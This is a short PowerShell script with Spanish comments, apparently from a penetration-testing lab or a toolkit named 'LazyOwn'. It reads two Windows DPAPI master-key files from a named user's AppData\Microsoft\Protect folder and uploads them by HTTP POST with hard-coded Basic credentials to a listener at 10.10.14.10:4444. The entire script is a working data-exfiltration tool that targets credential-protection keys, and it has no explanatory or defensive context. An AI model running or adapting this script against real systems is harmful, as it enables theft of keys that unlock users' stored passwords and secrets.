$Username = "LazyOwn"
$Password = "LazyOwn"
$Auth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))

# Ruta de los archivos a descargar
$FilePaths = @(
    "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b",
    "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\C4BB96844A5C9DD45D5B6A9859252BA6"
)

foreach ($FilePath in $FilePaths) {
    # Crear los datos para la solicitud
    $Boundary = "--------------------------$(Get-Random)-$(Get-Random)-$(Get-Random)"
    $FileName = [System.IO.Path]::GetFileName($FilePath)
    $Body = @"
--$Boundary
Content-Disposition: form-data; name="file"; filename="$FileName"
Content-Type: application/octet-stream

$(Get-Content -Raw -Path $FilePath)
--$Boundary--
"@

    # Convertir el cuerpo en bytes
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($Body)

    # Realizar la solicitud HTTP
    Invoke-WebRequest -Uri "http://10.10.14.10:4444/upload" `
                      -Method POST `
                      -Headers @{
                          Authorization = "Basic $Auth"
                          "Content-Type" = "multipart/form-data; boundary=$Boundary"
                      } `
                      -Body $Bytes
}
